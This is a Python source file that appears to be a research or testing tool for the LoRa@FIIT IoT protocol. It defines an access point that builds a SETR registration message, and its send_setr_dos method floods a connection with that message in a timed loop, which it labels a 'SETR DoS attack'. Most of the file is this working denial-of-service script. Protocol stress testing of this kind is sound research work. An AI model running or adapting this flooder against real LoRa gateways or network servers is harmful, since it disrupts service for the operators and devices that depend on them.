import json
import time
from datetime import timedelta

from lora import NET_CONFIG
from lora import GW_DUTY_CYCLE
from lora import LORA_VERSION
from lora import SUP_FREQUENCIES
from lora import SPREADING_FACTORS
from lora import CODING_RATES
from lora import BANDS
from lora import MAX_POWER
from lora import LoRa
from lora import MessageType


class AccessPoint:
    def __init__(self, hw_id, conn, delay, limit):
        self.hw_id = hw_id
        self.net_config = NET_CONFIG
        self.duty_cycle_refresh = LoRa.get_future_time()
        self.duty_cycle = GW_DUTY_CYCLE
        self.conn = conn
        self.duty_cycle_na = 0
        self.x = 0
        self.y = 0
        self.delay = delay / 1000
        self.limit = limit

    def generate_setr(self):
        message = {}
        message_body = {}
        lora_stand = {}

        message['message_name'] = MessageType.SETR.value
        message_body['id'] = self.hw_id
        message_body['ver'] = LORA_VERSION
        message_body['m_chan'] = True
        message_body['channels'] = 8
        message_body['sup_freqs'] = SUP_FREQUENCIES
        message_body['sup_sfs'] = SPREADING_FACTORS
        message_body['sup_crs'] = CODING_RATES
        message_body['sup_bands'] = BANDS
        message_body['max_power'] = MAX_POWER

        lora_stand['name'] = "LoRa@FIIT"
        lora_stand['version'] = "1.0"

        message_body['lora_stand'] = lora_stand
        message['message_body'] = message_body

        json_message = json.dumps(message, separators=(',', ':'), sort_keys=True)
        return json_message.encode('ascii')

    def send_setr_dos(self):
        send_counter = 0
        setr_message = self.generate_setr()
        start_time = time.time()
        print_limit = int(self.limit) // 4

        if print_limit == 0:
            print_limit = 1

        while True:
            self.conn.send_data(setr_message)
            send_counter += 1
            if send_counter % print_limit == 0:
                print(f"[INFO]: Sent {send_counter} SETR messages...")
            if send_counter >= self.limit:
                final_time = time.time() - start_time
                print("\n[INFO]: Finished SETR DoS attack")
                print(f"\nSent {send_counter} SETR messages in {final_time:.2f} seconds\n")
                break
            time.sleep(self.delay)
